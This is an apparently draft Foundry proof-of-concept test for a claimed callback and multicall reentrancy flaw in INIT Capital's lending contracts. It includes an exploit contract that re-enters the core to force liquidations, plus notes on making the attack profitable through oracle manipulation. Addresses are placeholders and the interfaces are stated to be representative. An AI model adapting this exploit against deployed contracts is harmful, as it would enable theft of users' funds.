// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

/**
 * @title callback-reentrancy.draft.t.sol
 * @notice DRAFT — Foundry fork-test skeleton demonstrating multicall + callback reentrancy
 *         bypassing deferred health checks on INIT Capital.
 *
 * **WHAT IT PROVES:**
 *   - `callback()` at InitCore.sol:512 has NO nonReentrant.
 *   - `multicall()` at InitCore.sol:396 also has NO nonReentrant.
 *   - During multicall, `isMulticallTx=true` means `ensurePositionHealth` only ADDS to
 *     `uncheckedPosIds` without actually verifying health (InitCore.sol:68-72).
 *   - A callback inside a multicall can re-enter the core and call `borrow()` / `liquidate()`
 *     / `mintTo()` since the reentrancy lock is NOT set by multicall.
 *   - `liquidate()` at InitCore.sol:288 has NO `onlyAuthorized` check — anyone can liquidate
 *     any unhealthy position. Combined with the callback bridge, this lets an attacker force
 *     liquidations from within a multicall context.
 *
 * **REQUIRES:**
 *   1. A running local fork of Mantle (or Blast) with INIT Capital deployed
 *      (chain id and RPC in foundry.toml).
 *   2. The actual deployed contract addresses for InitCore, PosManager, LendingPools, etc.
 *   3. Impersonation of a position owner (or creating test positions on the fork).
 *
 * **HOW TO RUN:**
 *   forge test --match-contract CallbackReentrancyPoC -vvv
 *   (after filling in the address placeholders below)
 *
 * **DRAFT STATUS:**
 *   This is a STRUCTURAL SKELETON — function selectors, event signatures, and
 *   interface definitions are representative. Actual deployed INIT Capital contracts
 *   may use different ABI encodings. This skeleton must be adapted to the specific
 *   deployed contract addresses and ABIs on the target chain.
 */

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ─── Minimal Interface Sketches ─────────────────────────────────────────────
// Replace these with actual interface bindings from the INIT source.

interface IInitCore {
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results);
    function callback(address to, uint value, bytes memory data) external payable returns (bytes memory result);
    function borrow(address pool, uint amt, uint posId, address to) external returns (uint shares);
    function repay(address pool, uint shares, uint posId) external returns (uint amt);
    function mintTo(address pool, address to) external returns (uint shares);
    function burnTo(address pool, address to) external returns (uint amt);
    function liquidate(
        uint posId, address poolToRepay, uint repayShares, address poolOut, uint minShares
    ) external returns (uint shares);
    function getPosHealthCurrent_e18(uint posId) external returns (uint health_e18);
    function oracle() external view returns (address);
    function config() external view returns (address);
    function riskManager() external view returns (address);
    function POS_MANAGER() external view returns (address);
}

interface IPosManager {
    function isAuthorized(address account, uint posId) external view returns (bool);
    function getPosDebtShares(uint posId, address pool) external view returns (uint);
    function getCollAmt(uint posId, address pool) external view returns (uint);
    function createPos(address owner, uint16 mode, address viewer) external returns (uint posId);
    function getPosMode(uint posId) external view returns (uint16);
    function ownerOf(uint tokenId) external view returns (address);
}

interface ILendingPool {
    function underlyingToken() external view returns (address);
    function totalAssets() external view returns (uint);
    function totalDebt() external view returns (uint);
    function cash() external view returns (uint);
    function totalSupply() external view returns (uint);
}

// ─── The Exploit Contract ──────────────────────────────────────────────────

/// @notice Implements ICallbackReceiver.coreCallback() to re-enter InitCore
///         from within a multicall batch. The attacker deploys this contract,
///         then constructs a multicall that includes callback() → this contract.
contract ExploitContract {
    IInitCore public core;

    // Tracking for test assertions
    bool public liquidateWasCalled;
    uint public liquidatedPosId;
    uint public collateralReceived;

    constructor(address _core) {
        core = IInitCore(_core);
    }

    /// @notice Called by InitCore.callback() during the multicall.
    ///         From here we can re-enter any InitCore function because:
    ///         - multicall() doesn't hold nonReentrant
    ///         - callback() doesn't hold nonReentrant
    ///         - isMulticallTx = true (health checks deferred)
    /// @param _sender  msg.sender from InitCore's perspective (the multicaller)
    /// @param _data    Encoded instructions for what to do inside the callback
    function coreCallback(address _sender, bytes calldata _data) external payable returns (bytes memory) {
        require(msg.sender == address(core), "only callable by core");
        // _sender is the original caller of multicall()

        // Decode what action to take
        (uint8 action, uint posId, address poolToRepay, uint repayShares, address poolOut) =
            abi.decode(_data, (uint8, uint, address, uint, address));

        if (action == 0) {
            // ACTION 0: Liquidate a victim position
            // `liquidate()` has NO onlyAuthorized check — anyone can call it.
            // The liquidator (this contract) needs repay tokens to pay the debt.
            // Those tokens must be acquired before this callback (e.g., from a
            // borrow in an earlier step of the multicall).
            uint shares = core.liquidate(posId, poolToRepay, repayShares, poolOut, 0);
            liquidateWasCalled = true;
            liquidatedPosId = posId;
            collateralReceived = shares;
        } else if (action == 1) {
            // ACTION 1: Unauthorized borrow — msg.sender (this contract) must be
            //           authorized for the position. Fails unless attacker pre-approved.
            core.borrow(poolToRepay, repayShares, posId, address(this));
        } else if (action == 2) {
            // ACTION 2: Deposit and mint (no authorization needed)
            core.mintTo(poolToRepay, _sender);
        }

        return abi.encode("callback-reentrancy-ok");
    }
}

// ─── The PoC Test ──────────────────────────────────────────────────────────

contract CallbackReentrancyPoC is Test {
    // ── PLACEHOLDER: Fill in with actual deployed addresses ──
    address constant INIT_CORE = address(0x1234);
    address constant POS_MANAGER = address(0x5678);
    address constant RISK_MANAGER = address(0x9abc);
    address constant ORACLE = address(0xdef0);

    // ── Pool addresses (deployed on Mantle/Blast) ──
    address constant POOL_WETH = address(0xaaaa);
    address constant POOL_USDC = address(0xbbbb);
    address constant POOL_WMNT = address(0xcccc);

    // ── Underlying tokens ──
    address constant WETH = address(0xdddd);
    address constant USDC = address(0xeeee);

    IInitCore core;
    IPosManager posManager;
    ExploitContract exploit;

    // Attacker's test positions
    uint attackerPosId;
    uint victimPosId;

    // ── Setup: Fork the chain and create test positions ──
    function setUp() public virtual {
        // If running against a fork, use vm.createSelectFork()
        // vm.createSelectFork("mantle_rpc_url");

        core = IInitCore(INIT_CORE);
        posManager = IPosManager(POS_MANAGER);
        exploit = new ExploitContract(INIT_CORE);

        // Impersonate the attacker (or use pre-funded test accounts)
        address attacker = address(0xDEAD);
        vm.deal(attacker, 1000 ether);

        // Create a test position for the attacker
        vm.startPrank(attacker);
        // Step 1: Create the position
        // bytes memory createData = abi.encodeWithSelector(core.createPos.selector, uint16(1), attacker);
        // bytes[] memory calls = new bytes[](1);
        // calls[0] = createData;
        // bytes[] memory results = core.multicall(calls);
        // (attackerPosId) = abi.decode(results[0], (uint));
        vm.stopPrank();
    }

    // ── Test 1: Prove callback re-enters during multicall ──
    function test_CallbackReentersDuringMulticall() public {
        // This test proves the most basic premise:
        // During a multicall, callback() calls coreCallback(), which can
        // successfully call back into InitCore (proving nonReentrant is not held).

        bytes[] memory multicallData = new bytes[](1);

        // Encode callback to exploit contract — make it do nothing (action=0 with 0 values)
        bytes memory callbackPayload = abi.encodeWithSelector(
            IInitCore.callback.selector,
            address(exploit),   // _to = exploit contract
            0,                  // _value = 0
            abi.encode(uint8(0), uint(0), address(0), uint(0), address(0))  // no-op action
        );
        multicallData[0] = callbackPayload;

        // Execute multicall — this should succeed, proving callback re-entry works
        core.multicall(multicallData);

        // If we get here, the callback was called and returned successfully,
        // proving that nonReentrant is NOT blocking re-entry from callback.
        assertTrue(true, "callback reentry succeeded");
    }

    // ── Test 2: Borrow + callback liquidate ──
    function test_BorrowThenLiquidateViaCallback() public {
        // This test demonstrates the exploit flow:
        // 1. Borrow from attacker's position (goes unhealthy, health check deferred)
        // 2. callback() → coreCallback() → liquidate a victim position
        // 3. The liquidator (exploit contract) gets victim's collateral
        //
        // NOTE: This test will REVERT at the multicall health check unless the
        // borrowed amount is repaid within the same multicall. This is EXPECTED
        // behavior — it proves the revert barrier exists.
        //
        // TO MAKE THIS PROFITABLE: The attacker must either:
        //   (a) Restore the borrowing position's health within the multicall, OR
        //   (b) Use the callback to manipulate an oracle price so that the health
        //       check passes at a temporarily favorable valuation, OR
        //   (c) Accept the revert and use a different mechanism to capture value
        //       from the intermediate state (e.g., a keeper network that advances
        //       blocks through external means — not possible on vanilla EVM)

        // ── TODO: Set up a victim position that's unhealthy ──
        // For now, this is a structural sketch.

        // vm.startPrank(attacker);
        //
        // bytes[] memory multicallData = new bytes[](2);
        //
        // // Step 1: Borrow from attacker's position
        // multicallData[0] = abi.encodeWithSelector(
        //     core.borrow.selector,
        //     POOL_WETH, 100 ether, attackerPosId, address(exploit)
        // );
        //
        // // Step 2: Callback → exploit contract liquidates victim
        // multicallData[1] = abi.encodeWithSelector(
        //     core.callback.selector,
        //     address(exploit), 0,
        //     abi.encode(uint8(0), victimPosId, POOL_WETH, 50 ether, POOL_USDC)
        // );
        //
        // try core.multicall(multicallData) {
        //     // If the multicall succeeds, the liquidate happened and collateral was extracted
        //     assertTrue(exploit.liquidateWasCalled(), "liquidate was called");
        //     assertGt(exploit.collateralReceived(), 0, "collateral was received");
        // } catch {
        //     // If it reverts, the health check caught the unhealthy position
        //     console.log("Multicall reverted at health check — expected without health restoration");
        // }
        //
        // vm.stopPrank();
    }

    // ── Test 3: Verify ensurePositionHealth modifier defers during multicall ──
    function test_HealthCheckDeferredDuringMulticall() public {
        // Proves that during isMulticallTx=true, ensurePositionHealth only
        // adds to uncheckedPosIds without reverting.

        // Execute a multicall with a borrow that would make the position unhealthy:
        // 1. Attacker's position has some collateral
        // 2. Borrow more than collateral can support
        // 3. This should NOT revert during the multicall (only at the end)

        // vm.startPrank(attacker);
        //
        // bytes[] memory multicallData = new bytes[](1);
        //
        // // Borrow an amount that guarantees unhealthiness
        // (function selector, the function will add to uncheckedPosIds)
        // multicallData[0] = abi.encodeWithSelector(
        //     core.borrow.selector,
        //     POOL_WETH, 100_000 ether, attackerPosId, attacker
        // );
        //
        // try core.multicall(multicallData) {
        //     fail("Multicall should have reverted — position would be unhealthy");
        // } catch {
        //     // Expected revert — proves that the health check at the end caught it
        //     console.log("Correctly reverted at end-of-multicall health check");
        // }
        //
        // vm.stopPrank();
    }

    // ── Helper ──
    function getCore() internal view returns (IInitCore) {
        return core;
    }
}
